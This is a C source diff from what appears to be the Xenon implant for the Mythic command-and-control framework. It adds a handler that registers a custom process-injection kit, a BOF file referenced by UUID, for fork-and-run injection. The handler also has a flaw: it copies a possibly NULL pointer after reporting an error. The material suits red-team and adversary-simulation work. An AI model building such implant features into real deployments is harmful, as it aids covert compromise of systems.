@@ -100,4 +100,57 @@ VOID AgentSpawnto(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
     PackageComplete(taskUuid, NULL);
 }
 
-#endif //INCLUDE_CMD_SPAWNTO
+#endif  //INCLUDE_CMD_SPAWNTO
+
+
+
+
+#ifdef INCLUDE_CMD_REGISTER_PROCESS_INJECT_KIT
+/**
+ * Update process inject kit.
+ * A UUID string is set in the global Xenon instance which represents a file on the Mythic server.
+ */
+VOID AgentRegisterProcessInjectKit(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
+{
+#define TASK_UUID_SIZE      36
+
+    UINT32 nbArg = ParserGetInt32(arguments);
+    _dbg("\t Got %d arguments", nbArg);
+    if (nbArg == 0)
+        return;
+
+    SIZE_T uuidLen        = 0;
+    SIZE_T uuidLen2       = 0;
+    BOOL isCustomKit      = (BOOL)ParserGetInt32(arguments);
+    PCHAR  injectKitSpawn = NULL;
+    PCHAR  injectKitExplicit = NULL;
+    if (isCustomKit) {
+        _dbg("[+] Registering Custom Process Injection Kit.")
+        injectKitSpawn = ParserGetString(arguments, &uuidLen);        // Mythic file UUID for BOF
+        
+        // if (nbArg > 2)
+        //     injectKitExplicit = ParserGetString(arguments, &uuidLen2);
+    }
+    else {
+        goto END;
+    }
+
+    // TODO - There is another file UUID for PROCESS_INJECT_EXPLICIT hook, but we not implementing that yet...
+
+    if (injectKitSpawn == NULL || uuidLen == 0)
+    {
+        _err("Failed to parse file uuid process");
+        PackageError(taskUuid, 0);
+    }
+    
+    // Replace UUID to BOF for fork & run injection
+    strncpy(xenonConfig->injectKitSpawn, injectKitSpawn, TASK_UUID_SIZE + 1);
+
+    _dbg("Updated Xenon PROCESS_INJECT_SPAWN to MythicFile: %s", xenonConfig->injectKitSpawn);
+    
+END:
+    // Success
+    PackageComplete(taskUuid, NULL);
+}
+
+#endif //INCLUDE_CMD_REGISTER_PROCESS_INJECT_KIT
